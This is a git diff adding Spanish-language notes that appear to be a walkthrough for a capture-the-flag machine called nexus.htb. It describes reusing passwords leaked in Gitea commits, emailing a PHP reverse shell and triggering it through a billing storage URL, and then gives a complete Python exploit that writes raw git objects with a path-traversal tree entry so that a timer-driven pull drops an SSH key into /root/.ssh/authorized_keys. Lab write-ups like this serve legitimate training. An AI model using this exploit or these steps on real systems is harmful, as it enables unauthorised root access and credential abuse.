@@ -1,0 +1,87 @@
+* investica subdominios
+* encontraras un gitea publico git.nexus.htb
+* analizar los correos en nexus.htb
+* reutiliza la contraseñas encontradas en los comits contra los correos de las otras persona	
+* crea un correo envialo a quien sea y adjuntale una revshell.
+* accede a la siguiente ruta para que puedas usar tu revshell
+	- captura la respuesta con burpsuite para obtener 
+	- http://billing.nexus.htb/storage/emails/<Id>/rev.php
+
+* una vez dentro, analiza el .env real de la aplicacion. econtraras una cotraseña
+* reusa la contraseña en jones y gana la userflag y acceso
+*** root ***
+* con la nueva contraseña de jones accede a git
+* crea un repositorio, !El repo tiene que estar marcado como plantilla! añade un archivo para que no este vacio y clonalo en kali
+* utiliza el siguiente scritp para crear un archivo que se salga de la ruta y pueda escribir en root 
+
+
+++++ exp.py ++++
+
+#!/usr/bin/env python3
+import hashlib
+import os
+import zlib
+import sys
+
+# Ajusta esta ruta al repositorio bare que estés usando
+REPO = "./b"
+
+def write_object(obj_type, data):
+    """Escribe un objeto Git crudo en .git/objects y devuelve su SHA-1."""
+    header = f"{obj_type} {len(data)}\0".encode()
+    full = header + data
+    sha = hashlib.sha1(full).hexdigest()
+    obj_dir = os.path.join(REPO, ".git", "objects", sha[:2])
+    obj_path = os.path.join(obj_dir, sha[2:])
+    os.makedirs(obj_dir, exist_ok=True)
+    with open(obj_path, "wb") as f:
+        f.write(zlib.compress(full))
+    return sha
+
+def main():
+    if not os.path.isdir(os.path.join(REPO, ".git")):
+        print(f"[!] No parece un repo Git: {REPO}")
+        sys.exit(1)
+
+    # 1. Blob con el contenido de prueba
+    content = b"<TU llave publica SSH>\n"
+    blob_sha = write_object("blob", content)
+    print(f"[+] Blob SHA: {blob_sha}")
+
+    # 2. Tree con path traversal
+    # Formato de entrada tree: "<modo> <nombre>\0<20 bytes de hash binario>"
+    entry_name = b"../../../../../../root/.ssh/authorized_keys"
+    entry_mode = b"100644"
+    entry_data = entry_mode + b" " + entry_name + b"\0" + bytes.fromhex(blob_sha)
+    tree_sha = write_object("tree", entry_data)
+    print(f"[+] Tree SHA: {tree_sha}")
+
+    # 3. Commit apuntando al tree
+    commit_data = (
+        f"tree {tree_sha}\n"
+        f"author poc <poc@localhost> 0 +0000\n"
+        f"committer poc <poc@localhost> 0 +0000\n"
+        f"\npoc\n"
+    ).encode()
+    commit_sha = write_object("commit", commit_data)
+    print(f"[+] Commit SHA: {commit_sha}")
+
+    # 4. Actualizar refs/heads/main
+    ref_path = os.path.join(REPO, ".git", "refs", "heads", "main")
+    os.makedirs(os.path.dirname(ref_path), exist_ok=True)
+    with open(ref_path, "w") as f:
+        f.write(commit_sha + "\n")
+    print(f"[+] refs/heads/main -> {commit_sha}")
+
+    # 5. Verificación con git ls-tree
+    print("\n[+] Verificación:")
+    os.system(f"cd {REPO} && git ls-tree -r HEAD")
+
+if __name__ == "__main__":
+    main()
+
+++++ eof ++++
+
+* al ejecutar, debes poder añadir un gitree (de esta manera es como puedes colocar '../' en rutas de archivos)
+* subelo al repositorio, un proceso almacenado en un systemd.timers lo va a jalar y escribir
+* accede como root por ssh
